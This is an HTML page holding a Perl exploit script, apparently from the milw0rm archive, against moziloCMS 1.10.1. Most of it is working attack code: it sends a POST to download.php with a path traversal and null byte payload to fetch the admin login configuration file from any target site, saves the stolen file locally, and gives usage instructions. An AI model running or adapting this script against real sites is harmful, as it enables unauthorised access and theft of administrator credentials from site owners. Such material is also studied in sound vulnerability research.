<html><head><title>moziloCMS 1.10.1 (download.php) Arbitrary Download File Exploit</title></head><pre>#!/usr/bin/perl
#
# moziloCMS 1.10.1 Perl exploit
#
# discovered &amp; written by Ams
# ax330d [doggy] gmail [dot] com
#
# DESCRIPTION:
# Vulnerability hides in &quot;download.php&quot;, which we can use to download any file we want to.
# Here, for example, &quot;admin/conf/logindata.conf&quot;. (Btw, not very smart solution to keep it open
# not looking on that it is protected by .htaccess)
# Script does not filters global params, it only checks whether local file exists...
# (By the way, all downloads are logged to &quot;/conf/downloads.conf&quot;)
#
# USAGE:
# Run exploit :perl expl.pl http://www.site.com
#
# NEEDED:
# magic_quotes_gpc = off
#

use strict;
use IO::Socket;

print &quot;\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	\n\t\t moziloCMS 1.10.1 exploit (by Ams)
	\n\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n&quot;;

if(@ARGV&lt;1){
	die &quot;\n\tUsage:\texpl.pl [host]\n\n
	\n\tExample:\texpl.pl http://localhost/blog/\n\n&quot;;
}

my $expl_url = $ARGV[0];

print &quot;\n\t[~] Starting exploit...\n&quot;;

if($expl_url =~ m#http://#) {
	exploit($expl_url);
} else {
	exploit('http://'.$expl_url);
}

sub exploit {
	
	#	Defining vars.
	my $site = pop @_;
	my ($a, $b, $c, @d) = split /\//,$site;
	my $path = join('/',@d);
	my $host = $c;
	if($path) {$path = '/'.$path;}
	my ($length, $packet, $downloaded, $injection);
	
	#	Revealing /data/sess.php.
	print &quot;\n\t[~] Sending request to 'downloads.php'...\n&quot;;
	$injection = &quot;file=hola&amp;cat=../admin/conf/logindata.conf%00&quot;;
	$length = length($injection);
	$packet = &quot;POST $path/download.php HTTP/1.1\r\n&quot;;
	$packet .= &quot;Host: $host\r\n&quot;;
	$packet .= &quot;Connection: Close\r\n&quot;;
	$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$packet .= &quot;Content-Length: $length\r\n\r\n&quot;;
	$packet .= &quot;$injection&quot;;
	$downloaded = send_surprise($host, $packet, 1);
	
	if($downloaded =~ /hackin/) {
		print &quot;\n\t[-] Exploiting failed...\n&quot;;
	} elsif ($downloaded =~ /200 OK/) {
		#	Parsing and saving received data.
		$downloaded =~ /\r\n\r\n/ ;
		$downloaded = $';
		
		open(DOWNL, &quot;&gt;hola.txt&quot;);
		print DOWNL $downloaded;
		close(DOWNL);
		print &quot;\n\t[+] Looks like ok! Check hola.txt\n&quot;;
	} else {
		print &quot;\n\t[-] Exploiting failed...\n&quot;;
	}
}

sub send_surprise() {
		
	my $dat = 1;
	my ($host, $packet, $ret) = @_;
	my $socket=IO::Socket::INET-&gt;new(
		Proto=&gt;&quot;tcp&quot;,
		PeerAddr=&gt;$host,
		PeerPort=&gt;&quot;80&quot;
	);
	if( ! $socket) {
		return 0;
	} else {
		
		print $socket $packet;
		if($ret) {
			my $rcv;
			while($rcv = &lt;$socket&gt;) {
			$dat .= $rcv;
			}
		}
		close ($socket);
		return $dat;
	}
}

# milw0rm.com [2008-08-02]</pre></html>